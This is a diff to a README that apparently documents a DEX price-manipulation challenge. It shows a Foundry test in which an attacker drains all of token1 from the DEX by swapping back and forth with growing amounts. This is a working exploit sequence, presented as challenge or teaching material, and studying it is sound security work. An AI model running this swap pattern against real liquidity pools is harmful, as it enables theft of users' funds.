@@ -8,13 +8,13 @@ Protocol - The protocol is a DEX the allows two different types of token to be s
 
 ### Test Case:
 
-`     
-      function test_multiple_swaps() public {
+`function test_multiple_swaps() public {
         vm.startPrank(attacker);
         token1.approve(address(dex), 100);
         token2.approve(address(dex), 100);
 
         uint256 token1Expected = token1.balanceOf(address(dex));
+        // uint256 token2Expected = token2.balanceOf(address(dex));
         dex.swap(address(token1), address(token2), 10);
         dex.swap(address(token2), address(token1), 20);
         dex.swap(address(token1), address(token2), 24);
@@ -23,12 +23,13 @@ Protocol - The protocol is a DEX the allows two different types of token to be s
         dex.swap(address(token2), address(token1), 45);
 
         uint256 token1Balance = token1.balanceOf(attacker);
+        // uint256 token2Balance = token2.balanceOf(attacker);
+        // uint256 token2ExpectedAfter = token2.balanceOf(address(dex));
         uint256 token1ExpectedAfter = token1.balanceOf(address(dex));
 
         assert(token1Balance == token1Expected + 10);
         assertEq(token1ExpectedAfter, 0);
-    }
-`
+    }`
 
 
 ## Foundry
